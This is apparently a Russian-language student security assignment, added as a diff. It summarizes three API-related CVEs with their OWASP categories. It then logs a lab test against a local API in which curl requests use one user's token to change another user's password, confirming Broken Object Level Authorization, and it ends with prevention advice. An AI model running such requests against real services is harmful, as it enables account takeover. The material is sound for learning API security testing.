@@ -1,0 +1,213 @@
+<h2>Часть 1</h2>
+<h3>Ссылки на источники</h3>
+<h4>1. CVE-2025-9209 — RestroPress: Authentication Bypass через REST API</h4>
+<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-9209">https://nvd.nist.gov/vuln/detail/CVE-2025-9209</a>
+<strong>Источник:</strong> NVD. Уязвимость опубликована 3 октября 2025 года. NVD пишет, что в RestroPress версии 3.0.0–3.1.9.2 через endpoint <code>/wp-json/wp/v2/users</code> раскрывались private tokens и API data, из-за чего неаутентифицированный атакующий мог подделать JWT-токены других пользователей, включая администратора, и войти от их имени.</p>
+<p><strong>К какой категории OWASP относится:</strong><br><a href="https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/">https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/</a>
+Лучше всего это привязать к <strong>API2:2023 — Broken Authentication</strong>, потому что итогом становится обход аутентификации и захват чужой учетной записи. OWASP относит к API2 случаи, когда можно скомпрометировать токены или “assume other users’ identities”.</p>
+<p><strong>В чем заключается недостаток:</strong><br>REST API возвращал данные, которые нельзя было отдавать клиенту: приватные токены пользователя. Получив такой токен, атакующий мог сформировать валидный JWT и авторизоваться как другой пользователь.</p>
+<p><strong>Причина недостатка:</strong><br>Главная причина — <strong>небезопасная реализация аутентификации и экспонирование чувствительных данных через API</strong>. То есть проблема не просто в “утечке информации”, а в том, что через API наружу ушли данные, напрямую влияющие на механизм авторизации.</p>
+<hr>
+<h4>2. CVE-2025-12030 — ACF to REST API: IDOR / Broken Object-Level Access</h4>
+<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-12030">https://nvd.nist.gov/vuln/detail/CVE-2025-12030</a>
+<strong>Источник:</strong> NVD. Уязвимость опубликована 7 января 2026 года. В плагине ACF to REST API до версии 3.3.4 была уязвимость <strong>Insecure Direct Object Reference</strong>. NVD указывает, что в <code>update_item_permissions_check()</code> проверялось только общее право <code>edit_posts</code>, но не проверялись объектные права вроде <code>edit_post($id)</code>, <code>edit_user($id)</code> или <code>manage_options</code>.</p>
+<p><strong>К какой категории OWASP относится:</strong><br><a href="https://owasp.org/API-Security/editions/2023/en/0xa5-broken-function-level-authorization/?utm_source=chatgpt.com">https://owasp.org/API-Security/editions/2023/en/0xa5-broken-function-level-authorization/?utm_source=chatgpt.com</a>
+Это очень близко к <strong>API1:2023 — Broken Object Level Authorization</strong>. OWASP описывает API1 как ситуацию, когда API работает с идентификаторами объектов и не проверяет, имеет ли пользователь право на доступ именно к этому объекту.</p>
+<p><strong>В чем заключается недостаток:</strong><br>Атакующий с низкими правами мог обращаться к endpoint’ам вида <code>/wp-json/acf/v3/{type}/{id}</code> и изменять чужие сущности: посты, пользователей, комментарии, термы и даже глобальные настройки, если мог подобрать или указать нужный <code>id</code>.</p>
+<p><strong>Причина недостатка:</strong><br>Причина — <strong>недостаточная проверка авторизации на уровне конкретного объекта</strong>. Сервер проверял только общее наличие некой роли/способности, но не проверял, относится ли целевой объект именно этому пользователю и разрешено ли ему менять именно его.</p>
+<hr>
+<h4>3. CVE-2025-14082 — Keycloak Admin REST API: Information Disclosure из-за слабой авторизации</h4>
+<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-14082?utm_source=chatgpt.com">https://nvd.nist.gov/vuln/detail/CVE-2025-14082?utm_source=chatgpt.com</a>
+<strong>Источник:</strong> NVD. Уязвимость опубликована 10 декабря 2025 года. В <strong>Keycloak Admin REST API</strong> через endpoint <code>/admin/realms/{realm}/roles</code> было возможно раскрытие чувствительных метаданных ролей из-за insufficient authorization checks. CWE указан как <strong>CWE-284 Improper Access Control</strong>.</p>
+<p><strong>К какой категории OWASP относится:</strong><br>Здесь логичнее всего указать <strong>API5:2023 — Broken Function Level Authorization</strong>. OWASP API5 описывает ситуации, когда пользователь может вызывать функции или административные endpoint’ы, к которым у него не должно быть доступа.</p>
+<p><strong>В чем заключается недостаток:</strong><br>Даже при наличии у атакующего только ограниченного доступа, endpoint административного REST API позволял получить метаданные ролей realm’а, которые не должны были быть доступны этому уровню пользователя.</p>
+<p><strong>Причина недостатка:</strong><br>Причина — <strong>некорректная серверная проверка прав для административной функции API</strong>. То есть endpoint существовал и был достижим, но разграничение ролей и прав для этой функции было реализовано неправильно.</p>
+<h2>Часть 2</h2>
+<p>сначала просто тыкаю все ручки</p>
+<p>100% надо проверить уязвимости связанные с авторизацией</p>
+<p>не понял как правильно дерагть ручик мутации (post put delete), я просто через консоль браузера пишу запросы на js 
+вот так</p>
+<pre><code class="language-js">fetch(&#39;/users/v1/register&#39;, {
+  method: &#39;POST&#39;,
+  headers: {
+    &#39;Content-Type&#39;: &#39;application/json&#39;
+  },
+  body: JSON.stringify({
+    username: &#39;testuser&#39;,
+    password: &#39;123456&#39;,
+    email: &#39;test@example.com&#39;
+  })
+})
+.then(r =&gt; r.json())
+.then(console.log)
+.catch(console.error);
+</code></pre>
+<p>мой пользователь успешно зарегистрировался
+try login</p>
+<pre><code class="language-js">fetch(&#39;/users/v1/login&#39;, {
+  method: &#39;POST&#39;,
+  headers: {
+    &#39;Content-Type&#39;: &#39;application/json&#39;
+  },
+  body: JSON.stringify({
+    username: &#39;testuser&#39;,
+    password: &#39;123456&#39;,
+//    email: &#39;test@example.com&#39;
+  })
+})
+.then(r =&gt; r.json())
+.then(console.log)
+.catch(console.error);
+</code></pre>
+<p>response</p>
+<pre><code>{
+    auth_token: &quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3NzQxNjg5NzQsImlhdCI6MTc3NDE2ODkxNCwic3ViIjoidGVzdHVzZXIifQ.SeJo7q-aJUsCDqGo-udJqKdm6bizu9Wa2-jJN2R8yv8&quot;
+	message: &quot;Successfully logged in.&quot;
+	status: &quot;success&quot;
+}
+</code></pre>
+<p>ну кстати возможно через курл удобней</p>
+<p>BASE=&quot;<a href="http://localhost:8080">http://localhost:8080</a>&quot;
+попробую проверить API1: broken object level auth
+регаю 2ух новых пользователей</p>
+<pre><code>curl -s -X POST &quot;$BASE/users/v1/register&quot; \
+  -H &quot;Content-Type: application/json&quot; \
+  -d &#39;{&quot;username&quot;:&quot;alice&quot;,&quot;password&quot;:&quot;alice123&quot;,&quot;email&quot;:&quot;alice@example.com&quot;}&#39;
+  
+curl -s -X POST &quot;$BASE/users/v1/register&quot; \
+  -H &quot;Content-Type: application/json&quot; \
+  -d &#39;{&quot;username&quot;:&quot;bob&quot;,&quot;password&quot;:&quot;bob123&quot;,&quot;email&quot;:&quot;bob@example.com&quot;}&#39;
+</code></pre>
+<p>логинюсь через alice</p>
+<pre><code>curl -s -X POST &quot;$BASE/users/v1/login&quot; \
+  -H &quot;Content-Type: application/json&quot; \
+  -d &#39;{&quot;username&quot;:&quot;alice&quot;,&quot;password&quot;:&quot;alice123&quot;}&#39;
+# и сохраняю ттокен
+
+TOKEN=&quot;сюда_вставь_jwt_токен_alice&quot;
+
+curl -i -s &quot;$BASE/users/v1/alice&quot; \
+  -H &quot;Authorization: Bearer $TOKEN&quot;
+</code></pre>
+<p>теперь с токеном alice пробую получить профиль боба - все успешно (юзенаме и почта)</p>
+<p>теперь пробую изменять данные боба под токеном алисы</p>
+<pre><code>curl -i -s -X PUT &quot;$BASE/users/v1/bob/email&quot;   -H &quot;Content-Type: application/json&quot;   -H &quot;Authorization: Bearer $TOKEN&quot;   -d &#39;{&quot;email&quot;:&quot;hacked_bob@example.com&quot;}&#39;
+HTTP/1.0 401 UNAUTHORIZED
+Content-Type: application/json
+Content-Length: 73
+Server: Werkzeug/1.0.1 Python/3.7.12
+Date: Sun, 22 Mar 2026 08:54:35 GMT
+
+{ &quot;status&quot;: &quot;fail&quot;, &quot;message&quot;: &quot;Signature expired. Please log in again.&quot;}
+
+curl -i -s -X PUT &quot;$BASE/users/v1/bob/password&quot; \
+  -H &quot;Content-Type: application/json&quot; \
+  -H &quot;Authorization: Bearer $TOKEN&quot; \
+  -d &#39;{&quot;password&quot;:&quot;newbob123&quot;}&#39;
+HTTP/1.0 401 UNAUTHORIZED
+Content-Type: application/json
+Content-Length: 73
+Server: Werkzeug/1.0.1 Python/3.7.12
+Date: Sun, 22 Mar 2026 08:55:16 GMT
+
+{ &quot;status&quot;: &quot;fail&quot;, &quot;message&quot;: &quot;Signature expired. Please log in again.&quot;}
+
+curl -i -s -X DELETE &quot;$BASE/users/v1/bob&quot; \
+  -H &quot;Authorization: Bearer $TOKEN&quot;
+HTTP/1.0 401 UNAUTHORIZED
+Content-Type: application/json
+Content-Length: 73
+Server: Werkzeug/1.0.1 Python/3.7.12
+Date: Sun, 22 Mar 2026 08:55:38 GMT
+
+{ &quot;status&quot;: &quot;fail&quot;, &quot;message&quot;: &quot;Signature expired. Please log in again.&quot;}
+</code></pre>
+<pre><code>curl -i -s &quot;$BASE/users/v1/bob&quot;   -H &quot;Authorization: Bearer $TOKEN&quot;
+HTTP/1.0 200 OK
+Content-Type: application/json
+Content-Length: 47
+Server: Werkzeug/1.0.1 Python/3.7.12
+Date: Sun, 22 Mar 2026 09:02:28 GMT
+
+{&quot;username&quot;: &quot;bob&quot;, &quot;email&quot;: &quot;bob@example.com&quot;}
+</code></pre>
+<p>ничего не выходит, но пишет что токен истек, попробую заново залогиниться и быстро сделать все тоже самое</p>
+<pre><code>curl -s -X POST &quot;$BASE/users/v1/login&quot; \
+  -H &quot;Content-Type: application/json&quot; \
+  -d &#39;{&quot;username&quot;:&quot;alice&quot;,&quot;password&quot;:&quot;alice123&quot;}&#39;
+{&quot;auth_token&quot;: &quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3NzQxNzAyNTMsImlhdCI6MTc3NDE3MDE5Mywic3ViIjoiYWxpY2UifQ.Qeox_yMpSscTmncS5xxF6SMDTh5EDQ_1Z6a6dWljKDk&quot;, &quot;message&quot;: &quot;Successfully logged in.&quot;, &quot;status&quot;: &quot;success&quot;}
+
+curl -i -s -X PUT &quot;$BASE/users/v1/bob/email&quot; \
+  -H &quot;Content-Type: application/json&quot; \
+  -H &quot;Authorization: Bearer $TOKEN&quot; \
+  -d &#39;{&quot;email&quot;:&quot;hacked_bob@example.com&quot;}&#39;
+HTTP/1.0 204 NO CONTENT
+Content-Type: application/json
+Server: Werkzeug/1.0.1 Python/3.7.12
+Date: Sun, 22 Mar 2026 09:03:31 GMT
+
+curl -i -s -X PUT &quot;$BASE/users/v1/bob/password&quot; \
+  -H &quot;Content-Type: application/json&quot; \
+  -H &quot;Authorization: Bearer $TOKEN&quot; \
+  -d &#39;{&quot;password&quot;:&quot;newbob123&quot;}&#39;
+HTTP/1.0 204 NO CONTENT
+Content-Type: application/json
+Server: Werkzeug/1.0.1 Python/3.7.12
+Date: Sun, 22 Mar 2026 09:03:48 GMT
+
+curl -i -s -X DELETE &quot;$BASE/users/v1/bob&quot; \
+  -H &quot;Authorization: Bearer $TOKEN&quot;
+HTTP/1.0 401 UNAUTHORIZED
+Content-Type: application/json
+Content-Length: 63
+Server: Werkzeug/1.0.1 Python/3.7.12
+Date: Sun, 22 Mar 2026 09:03:56 GMT
+
+{ &quot;status&quot;: &quot;fail&quot;, &quot;message&quot;: &quot;Only Admins may delete users!&quot;}
+</code></pre>
+<p>уже прилетаю 204, но удалить пользователя не получилось</p>
+<p>проверяем получилось ли поменять email или password</p>
+<pre><code>curl -i -s &quot;$BASE/users/v1/bob&quot;   -H &quot;Authorization: Bearer $TOKEN&quot;
+HTTP/1.0 200 OK
+Content-Type: application/json
+Content-Length: 47
+Server: Werkzeug/1.0.1 Python/3.7.12
+Date: Sun, 22 Mar 2026 09:05:15 GMT
+
+{&quot;username&quot;: &quot;bob&quot;, &quot;email&quot;: &quot;bob@example.com&quot;}
+</code></pre>
+<p>почта не поменялась</p>
+<pre><code>curl -i -s -X POST &quot;$BASE/users/v1/login&quot; \
+  -H &quot;Content-Type: application/json&quot; \
+  -d &#39;{&quot;username&quot;:&quot;bob&quot;,&quot;password&quot;:&quot;newbob123&quot;}&#39;
+HTTP/1.0 200 OK
+Content-Type: application/json
+Content-Length: 221
+Server: Werkzeug/1.0.1 Python/3.7.12
+Date: Sun, 22 Mar 2026 09:06:45 GMT
+
+{&quot;auth_token&quot;: &quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3NzQxNzA0NjUsImlhdCI6MTc3NDE3MDQwNSwic3ViIjoiYm9iIn0.xmect2NLLWVnKMBb75Y4rA8v8aJwHc1KNGuxm2ccebY&quot;, &quot;message&quot;: &quot;Successfully logged in.&quot;, &quot;status&quot;: &quot;success&quot;}
+
+curl -i -s -X POST &quot;$BASE/users/v1/login&quot; \
+  -H &quot;Content-Type: application/json&quot; \
+  -d &#39;{&quot;username&quot;:&quot;bob&quot;,&quot;password&quot;:&quot;bob123&quot;}&#39;
+HTTP/1.0 200 OK
+Content-Type: application/json
+Content-Length: 81
+Server: Werkzeug/1.0.1 Python/3.7.12
+Date: Sun, 22 Mar 2026 09:07:04 GMT
+
+{ &quot;status&quot;: &quot;fail&quot;, &quot;message&quot;: &quot;Password is not correct for the 
+</code></pre>
+<p>а вот пароль поменялся, победа!</p>
+<h3>Подведу итог</h3>
+<p>Подтвердилась уязвимость OWASP API1:2023 — Broken Object Level Authorization, потому что пользователь alice смог поменять пароль пользователя bob</p>
+<p>Иными словами, сервер не проверяет, имеет ли текущий пользователь право на доступ/изменение именно этого объекта.</p>
+<h4>Как предотвратить?</h4>
+<p>Нужно на каждом запросе сравнивать:</p>
+<ul>
+<li>кто пользователь из токена;</li>
+<li>к какому объекту он обращается;</li>
+<li>имеет ли он право работать именно с этим объектом.</li>
+</ul>
+<p>возможно проблема уже в том что alice получает email боба, но скорее всего на этом не надло было заострять внимание</p>
